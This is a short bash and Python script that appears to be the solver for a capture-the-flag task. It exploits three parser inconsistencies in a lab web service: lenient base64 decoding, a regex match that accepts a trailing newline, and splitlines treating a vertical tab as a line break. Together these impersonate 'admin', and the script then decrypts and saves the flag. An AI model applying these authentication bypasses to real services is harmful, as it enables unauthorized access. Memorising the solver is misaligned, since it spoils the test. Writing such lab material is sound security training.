#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"; PORT="${PORT:-8297}"; FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, hashlib, json, sys
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
req = Request(base + "/api/session", data=b"{}", method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
# Gap A: strict vs ignore decode. base64("admin\xff")="YWRtaW7/"
req = Request(base + "/api/auth", headers={"X-Session": sid, "X-Auth-Key": "YWRtaW7/"})
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap B: fullmatch vs match$. "admin\n": fullmatch fails, match$ matches before \n
body = json.dumps({"id": "admin\n"}).encode()
req = Request(base + "/api/beacon", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap C: splitlines vs split('\n'). "admin\x0buser": split sees admin\x0buser, splitlines sees admin
req = Request(base + "/api/roster", data=b"",
              headers={"X-Session": sid, "X-Roster": "admin\x0buser"}, method="POST")
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
